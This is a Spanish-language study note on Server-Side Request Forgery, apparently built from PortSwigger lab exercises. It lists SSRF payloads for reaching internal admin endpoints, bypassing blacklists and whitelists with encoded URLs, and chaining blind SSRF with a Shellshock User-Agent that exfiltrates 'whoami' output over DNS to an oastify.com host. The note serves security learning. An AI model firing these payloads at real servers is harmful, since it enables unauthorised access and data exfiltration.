
---
Tags: #ssrf #web #burpsuite #url #puertos #pivoting #fuzz #wfuzz #ffuf 

---
## 🗂️ Índice de Contenidos

- [[#📖 Definición y conceptos clave|1. Definición y conceptos clave]]
    
- [[#⚠️ Por qué ocurre una SSRF|2. Por qué ocurre una SSRF]]
    
- [[#🔎 Detección de SSRF|3. Detección de SSRF]]
    
- [[#💥 Técnicas de explotación|4. Técnicas de explotación]]
    - [[#4.1 SSRF básico contra servidor local|4.1 SSRF básico contra servidor local]]
    - [[#4.2 SSRF básico contra sistema interno (pivoting en red privada)|4.2 SSRF básico contra sistema interno]]
    - [[#4.3 SSRF ciego (Out-of-Band)|4.3 SSRF ciego (OAST)]]
    - [[#4.4 SSRF con filtros blacklist (bypass avanzado)|4.4 Blacklist y bypass]]
    - [[#4.5 SSRF mediante redirección abierta|4.5 Open Redirect]]
    - [[#4.6 SSRF ciego + Shellshock (cadena avanzada)|4.6 SSRF + Shellshock]]
    - [[#4.7 SSRF con whitelist (bypass semántico)|4.7 Whitelist bypass]]
        
- [[#🛡 Mitigaciones|5. Mitigaciones]]
    
- [[#🎯 Conclusión|6. Conclusión]]
    
- [[#Referencias|7. Referencias]]
---
## 📖 Definición y conceptos clave

**SSRF (Server-Side Request Forgery)** ocurre cuando una aplicación permite que un usuario controle total o parcialmente una URL que el **servidor backend** va a solicitar.

Impacto principal:

- Acceso a **servicios internos** (localhost, red privada)
    
- Bypass de controles de red
    
- Acceso a **metadatos cloud** (AWS, GCP, Azure)
    
- Encadenamiento con RCE, XSS, deserialización, etc.
    

---
## ⚠️ Por qué ocurre una SSRF

Causas comunes:

- Validación insuficiente de URLs
    
- Confianza excesiva en entradas del usuario
    
- Uso directo de funciones HTTP (`fetch`, `curl`, `axios`, `requests`)
    
- Filtros basados en strings en lugar de parsing real
    

---
## 🔎 Detección de SSRF

### Indicadores típicos

- Parámetros como:
    
    - `url= / link= / target= / next= / data= / redirect= / image= / domain=`
        
- Funcionalidades que:
    
    - Importan datos externos
        
    - Renderizan previews
        
    - Validan enlaces
        

### Técnicas

- Cambiar dominio por Burp Collaborator
    
- Probar `localhost`, `127.0.0.1`, IPs privadas
    
- Observar retrasos, errores o respuestas indirectas
    
---
# 💥 Técnicas de explotación SSRF (Análisis avanzado)

---

## 4.1 SSRF básico contra servidor local

### 📌 Escenario

El backend recibe el parámetro `stockApi` y realiza una petición HTTP server-side sin validar el destino.

**Flujo interno típico**:

1. El servidor recibe la request del usuario
    
2. Extrae `stockApi`
    
3. Ejecuta algo como:
    
    `HttpClient.get(stockApi)`
    
4. Devuelve o procesa la respuesta
    

---
### 📦 Payload

`stockApi=http://localhost/admin/delete?username=carlos`

---
### 🔍 Detección

Indicadores claros de SSRF local:

- Parámetros con nombres como: `url`, `api`, `endpoint`, `callback`, `stockApi`
    
- Cambios de comportamiento al usar:
    
    - `localhost`
        
    - `127.0.0.1`
        
    - `http://[::1]`
        
- Respuestas distintas según el host
    

Prueba inicial recomendada:

`stockApi=http://127.0.0.1`

---
### ⚙️ Explotación

- `localhost` → loopback interface del servidor
    
- `/admin/delete` → endpoint protegido solo para tráfico interno
    
- El backend **confía implícitamente** en sus propias peticiones
    

> ⚠️ Impacto real: bypass de autenticación + ejecución de acciones administrativas

---
### 🧠 Por qué funciona

|Fallo|Descripción|
|---|---|
|Confianza implícita|El servidor asume que lo interno es seguro|
|Falta de validación|No se valida host, IP ni esquema|
|Lógica de negocio rota|Acciones críticas expuestas internamente|

---
## 4.2 SSRF básico contra sistema interno (pivoting en red privada)

---
### 📌 Enumeración con Intruder

`stockApi=http://192.168.0.§§:8080`

---
### 🔎 Detección

- Uso de **Intruder** para detectar hosts vivos
    
- Respuestas distintas:
    
    - Timeout → host no existe
        
    - 403/401 → servicio real
        
    - HTML → panel web
        

---
### 📦 Payload final (Repeater)

`stockApi=http%3a//192.168.0.90%3a8080/admin/delete%3fusername%3dcarlos`

---
### ⚙️ Explotación

1. El backend decodifica la URL
    
2. Conecta a `192.168.0.90:8080`
    
3. Accede a `/admin/delete`
    
4. Ejecuta la acción sin autenticación
    
---
### 🧠 Impacto

- Acceso a:
    
    - Consolas internas
        
    - APIs privadas
        
    - Servicios cloud internos
        
- Posible **movimiento lateral**
    
---
## 4.3 SSRF ciego (Out-of-Band)

---
### 📌 Campo vulnerable

`Referer`

---
### 📦 Request

`Referer: https://604o10767swhyo9z6rjpsgo6cxio6oud.oastify.com/`

---
### 🔎 Detección

- No hay output visible
    
- Confirmación vía:
    
    - DNS
        
    - HTTP
        
    - HTTPS callbacks
        
---
### ⚙️ Explotación

- El servidor realiza la petición saliente
    
- El atacante recibe la interacción en OAST
    
---
### 🧠 Indicadores clave

|Señal|Significado|
|---|---|
|DNS lookup|SSRF confirmado|
|HTTP GET|Parser HTTP completo|
|User-Agent del servidor|Fingerprint del backend|

---
## 4.4 SSRF con filtros blacklist (bypass avanzado)

---
### 📌 Filtro detectado

Bloquea:

- `localhost`
    
- `127.0.0.1`
    
- `/admin`
    
---
### 📦 Payload usado

`stockApi=http%3a//127.1/%2561dmin/delete?username=carlos`

---
### 🔬 Técnicas aplicadas (en profundidad)

#### 1️⃣ Loopback alternativo

|Representación|Resultado|
|---|---|
|`127.1`|127.0.0.1|
|`127.0.1`|127.0.0.1|
|`2130706433`|127.0.0.1 (decimal)|

---
#### 2️⃣ Double URL Encoding

|Original|Encoded|Double encoded|
|---|---|---|
|`a`|`%61`|`%2561`|
|`/admin`|`/%61dmin`|`/%2561dmin`|

📌 **Clave**:  
El filtro decodifica una vez, el parser final decodifica dos.

---
### 📊 Tabla ampliada — Bypass de blacklist

|Técnica|Ejemplo|
|---|---|
|IPv6 loopback|`http://[::1]/`|
|Decimal IP|`http://2130706433/`|
|Octal IP|`http://0177.0.0.1/`|
|Hex IP|`http://0x7f000001/`|
|Mixed encoding|`%2f%61dmin`|
|Fragment abuse|`/admin#`|
|Null byte|`/admin%00`|

📎 [Referencia: PayloadsAllTheThings – SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-using-a-redirect)

---
## 4.5 SSRF mediante redirección abierta

---
### 📌 Escenario

Endpoint vulnerable a **Open Redirect**.

---
### 📦 Payload

`stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos`

---
### ⚙️ Explotación

1. El backend valida solo `/product/nextProduct`
    
2. Sigue la redirección
    
3. Accede al recurso interno
    
---
### 🧠 Fallo crítico

|Error|Descripción|
|---|---|
|Validación parcial|Solo primer endpoint|
|Redirect automático|Follow redirects enabled|
|Trust chaining|Confianza transitiva|

---
## 4.6 SSRF ciego + [[ShellShock]] (cadena avanzada)

---
### 🔎 Paso 1 — Confirmar SSRF

`Referer: https://shdaimosoed3faqlnd0b925stjzaneb3.oastify.com`

✔ Callback recibido → SSRF confirmado

---
### 🧨 Paso 2 — [[Shellshock]]

**[[Shellshock]]** es una vulnerabilidad en Bash que permite ejecutar comandos al procesar variables de entorno.

---
#### Payload en User-Agent

`User-Agent: () { :; }; /usr/bin/nslookup $(whoami).shdaimosoed3faqlnd0b925stjzaneb3.oastify.com`

---
#### ¿Qué ocurre internamente?

|Comando|Función|
|---|---|
|`whoami`|Obtiene usuario del proceso|
|`nslookup`|Genera exfiltración DNS|
|Subdominio|Transmite datos|

---
### 🧪 Paso 3 — Intruder (pivoting)

`Referer: http://192.168.0.$$:8080`

- Intruder prueba IPs internas
    
- Cuando una ejecuta Bash → callback válido
    
---
### 📥 Evidencia

`DNS lookup recibido: peter-xxxx.oastify.com`

---
## 4.7 SSRF con whitelist (bypass semántico)

---
### 📌 Filtro

Solo permite:

`stock.weliketoshop.net`

---
### 📦 Payload

`stockApi=http%3a//localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`

---
### 🔍 Análisis profundo del bypass

|Elemento|Interpretación|
|---|---|
|`localhost%2523`|`localhost#` tras doble decode|
|`#`|Fragment (ignorado por HTTP)|
|`@`|Separador userinfo|
|Host real|`localhost`|

---
### 🧠 Por qué funciona

1. El filtro valida la **string**
    
2. El parser URL usa:
    
    `scheme://userinfo@host/path`
    
3. El host real es `localhost`
    
4. `/admin` pertenece a localhost
    
---
### 📊 Tabla — Bypass whitelist

| Técnica         | Ejemplo                  |
| --------------- | ------------------------ |
| Userinfo        | `localhost@trusted.com`  |
| Fragment        | `localhost#@trusted.com` |
| Double decode   | `%2523`                  |
| DNS rebinding   | `evil.com → 127.0.0.1`   |
| Trailing dot    | `localhost.`             |
| Subdomain abuse | `localhost.trusted.com`  |

---
## 🛡 Mitigaciones

- Lista blanca estricta con parsing real
    
- Bloquear IPs privadas tras resolución DNS
    
- No seguir redirecciones
    
- Deshabilitar acceso a metadata cloud
    
---
## 🎯 Conclusión

SSRF es una vulnerabilidad crítica que rompe completamente el modelo de confianza de red. Su impacto depende del contexto, pero combinada con otras vulnerabilidades puede llevar a **compromiso total del sistema**.

---
## ⚙️ Herramientas útiles

|Herramienta|Uso principal|
|---|---|
|`ssrfmap`|Automatiza la explotación de SSRF|
|`Burp Suite`|Interceptar y modificar parámetros URL|
|`Interactsh`|Recibir conexiones salientes desde SSRF|
|`httpx` / `nmap`|Mapear servicios descubiertos|

---
# Referencias:

[PayloadsAlltheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-using-a-redirect)
